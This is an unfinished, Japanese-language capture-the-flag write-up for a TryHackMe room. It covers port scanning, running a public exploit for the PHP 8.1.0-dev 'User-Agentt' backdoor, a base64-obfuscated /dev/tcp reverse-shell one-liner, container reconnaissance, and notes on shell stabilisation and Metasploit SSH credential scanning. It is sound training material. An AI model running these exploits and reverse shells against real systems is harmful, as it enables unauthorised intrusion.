# Frank and Herby try again..... CTF

https://tryhackme.com/room/frankandherbytryagain

## Enumeration

```shell
TARGET=10.49.131.98
sudo bash -c "echo $TARGET   frank >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT      STATE    SERVICE      REASON
22/tcp    open     ssh          syn-ack ttl 64
10250/tcp open     unknown      syn-ack ttl 64
10255/tcp open     unknown      syn-ack ttl 64
10257/tcp open     unknown      syn-ack ttl 64
10259/tcp open     unknown      syn-ack ttl 64
16443/tcp open     unknown      syn-ack ttl 64
25000/tcp open     icl-twobase1 syn-ack ttl 64
30679/tcp filtered unknown      port-unreach ttl 64
```

```sh
sudo nmap -sV -p22,10250,10255,10257,10259,16443,25000,30679 $TARGET

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
10250/tcp open  ssl/http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
10255/tcp open  http        Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
10257/tcp open  ssl/unknown
10259/tcp open  ssl/unknown
16443/tcp open  ssl/unknown
25000/tcp open  ssl/http    Gunicorn 19.7.1
30679/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
```

### ディレクトリ列挙

```sh
dirb http://$TARGET:30679

+ http://10.49.131.98:30679/info.php (CODE:200|SIZE:66761)
```

### 脆弱性

PHP 8.1.0-dev にはRCEの脆弱性があった。

```sh
$ searchsploit PHP 8.1.0-dev                
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
...
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                              | php/webapps/49933.py
...
```

シェルを取れた。

```sh
$ python ./49933.py
Enter the full host url:
http://frank:30679/

Interactive shell is opened on http://frank:30679/ 
Can't acces tty; job crontol turned off.
$ id
uid=0(root) gid=0(root) groups=0(root)
```

リバースシェル

```sh
$ echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xMzguMjM2Lzg4ODggMD4mMQ== | base64 -d | bash
```

```sh
$ nc -lnvp 8888
listening on [any] 8888 ...
connect to [192.168.138.236] from (UNKNOWN) [10.49.131.98] 57914
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

何も入っていないので、Podの中のゲストOS。

## 権限昇格

```sh
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1440 qdisc noqueue state UP group default 
    link/ether 2e:0e:37:56:7d:c0 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.30.129/32 brd 10.1.30.129 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::2c0e:37ff:fe56:7dc0/64 scope link 
       valid_lft forever preferred_lft forever
```

```sh
cat /etc/hosts
# Kubernetes-managed hosts file.
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
fe00::0 ip6-mcastprefix
fe00::1 ip6-allnodes
fe00::2 ip6-allrouters
10.1.30.129     php-deploy-6d998f68b9-ntvd9
```

```sh
ping 10.1.30.129
PING 10.1.30.129 (10.1.30.129) 56(84) bytes of data.
64 bytes from 10.1.30.129: icmp_seq=1 ttl=64 time=0.019 ms
64 bytes from 10.1.30.129: icmp_seq=2 ttl=64 time=0.029 ms
64 bytes from 10.1.30.129: icmp_seq=3 ttl=64 time=0.029 ms
```

```sh
# capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=
```















## 続きは後日


```sh
# env_keep+=LD_PRELOAD は見落としがちなので注意
sudo -l
```

```sh
find / -perm -u=s -type f -ls 2>/dev/null
```

```sh
find / -user <name> -type f -not -path "/proc/*" 2>/dev/null
find / -group <group> -type f -not -path "/proc/*" 2>/dev/null
```

```sh
getcap -r / 2>/dev/null
ls -al /var/backups
cat /etc/crontab
cat /etc/exports
```

## 振り返り

-
-

## Tags

#tags:PHP脆弱性 #tags:Kubernetes #tags:

```sh
# 大分類（Linuxはタグ付けしない）
Window Kerberos pwn pwn(Windows) Crypto puzzle ウサギの穴 LLM

# 脆弱性の種類
CVE-xxxx-yyyyy カーネルエクスプロイト
ツール脆弱性 sudo脆弱性 PHP脆弱性 exiftool脆弱性 アプリケーション保存の認証情報

# 攻撃の種類
サービス LFI SSRF XSS SQLインジェクション 競合 フィルターバイパス アップロードフィルターバイパス ポートノッキング PHPフィルターチェーン レート制限回避 XSSフィルターバイパス　SSTIフィルターバイパス RequestCatcher プロンプトインジェクション Defender回避 リバースコールバック LD_PRELOAD セッションID AVバイパス UACバイパス AMSIバイパス

# ツールなど
docker fail2ban modbus ルートキット gdbserver jar joomla MQTT CAPTCHA git tmux john redis rsync pip potato ligolo-ng insmod pickle
```

## メモ

### シェル安定化

```shell
# python が無くても、python3 でいける場合もある
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# Ctrl+Z でバックグラウンドにした後に
stty raw -echo; fg

#（終了後）エコー無効にして入力非表示になっているので
reset

# まず、他のターミナルを開いて rows, columns の値を調べる
stty -a

# リバースシェルで rows, cols を設定する
stty rows 52
stty cols 236
```

### SSH

ユーザー名、パスワード（スペース区切り）ファイルを使ってSSHスキャンする

```sh
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS 10.10.165.96; set USERPASS_FILE creds.txt; run; exit"
```

エラー

```sh
# no matching host key type found. Their offer: ssh-rsa,ssh-dss
# このエラーが出るのはサーバー側のバージョンが古いためなので、下記オプション追加。
-oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=ssh-rsa
```
